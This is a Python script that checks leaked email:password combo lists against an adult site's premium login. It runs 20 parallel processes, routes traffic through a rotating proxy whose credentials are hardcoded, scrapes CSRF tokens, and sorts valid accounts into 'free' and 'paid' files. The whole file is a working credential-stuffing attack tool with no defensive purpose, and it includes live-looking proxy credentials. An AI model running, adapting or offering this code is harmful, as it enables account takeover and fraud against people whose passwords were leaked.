from multiprocessing import Process
from time import sleep
import os
import json
from bs4 import BeautifulSoup
import requests
from requests.structures import CaseInsensitiveDict
os.system("clear")
#file_name = input("\033[0;34m|\033[0;31mEnter your Combo list  \n\033[0;34m|-> \033[0;32m")
working = 0
free = 0
paid = 0
bad = 0
def mainw(com):
 for ts in com:
  combo = str(ts).split("'")[1]
  comb = combo.split(":")
  user = comb[0]
  pas = comb[1]
  username = "s6jroozwl2ni013"
  password = "ukom9ltlit9an1v"
  proxy = "rp.proxyscrape.com:6060"
  proxy = {"http":"http://{}:{}@{}".format(username,password, proxy)}
  r = requests.post("https://www.xnxx.gold/account/signinform/create/premium_tour",proxies=proxy)
  j = json.loads(r.text)
  r_cookie = (r.cookies)
  word = str(r_cookie)
  words = word.split(" ")
  cit = (words[1])
  si = (words[5])
  headers = CaseInsensitiveDict()
  headers["Host"]="www.xnxx.gold"
  headers["Accept"]="application/json,text/javascript,*/*;q=0.01"
  headers["Content-Type"]="application/x-www-form-urlencoded;charset=UTF-8"
  headers["User-Agent"]="Mozilla/5.0(Linux;Android11;M2101K7BI)AppleWebKit/537.36(KHTML,likeGecko)Chrome/106.0.0.0MobileSafari/537.36"
  headers["Accept-Encoding"]="gzip,deflate,br"
  headers["Accept-Language"]="en-IN,en;q=0.9"
  headers["Cookie"]= cit+';'+si
  form = j["form"]
  soup = BeautifulSoup(form,"html.parser")
  signin_form_form = soup.find(id="signin-form_form").get("value")
  signin_form_csrf_token = soup.find(id="signin-form_csrf_token").get("value")
  signin_form_pms = soup.find(id = "signin-form_pms").get("value")
  payload = (f"signin-form[form]={signin_form_form}&signin-form[votes]=&signin-form[subs]=&signin-form[post_referer]=&signin-form[csrf_token]={signin_form_csrf_token}&signin-form[pms]={signin_form_pms}&signin-form[login]={user}&signin-form[password]={pas}")
  re = requests.post("https://www.xnxx.gold/account/signinform/create/premium_tour",data=payload,headers=headers,proxies=proxy)
  if "is_premium" in re.text:
    print("login got")
    je = json.loads(re.text)["is_premium"]
    if je == False:
     fil = open('free.txt', 'a')
     fil.write(combo+"\n")
     fil.close()
    else:
     pfil = open('paid.txt', 'a')
     pfil.write(combo+"\n")
     pfil.close()
  else:
   print("am working")
def main():
    with open('210k combolist email-pass[netflix,spotify,vpn,deezer,fortnite,minecraft].txt', 'rb') as pass_file:
        passwords = [i.strip() for i in pass_file]

    N_PROC = 20
    for i in range(N_PROC):
        p = Process(target=mainw, args=[passwords[i::N_PROC]])
        p.start()


if __name__ == '__main__':
    main()
#    print("ok")
